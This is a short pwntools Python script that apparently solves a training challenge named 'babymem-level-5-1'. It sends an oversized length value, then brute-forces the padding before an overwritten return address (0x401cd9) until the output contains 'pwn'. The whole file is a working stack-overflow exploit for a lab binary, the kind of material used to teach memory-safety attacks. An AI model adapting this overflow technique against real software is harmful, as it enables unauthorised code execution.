from pwn import *
i = 10
while True:
    print("try "+ str(i))
    p = process('/challenge/babymem-level-5-1')
    p.sendline(b'1073741824')
    p.sendline(b'4')
    p.send(b'A'*i + p32(0x401cd9))
    text = p.recvall().decode()
    if "pwn" in text:
        print(text)
        break
    i += 1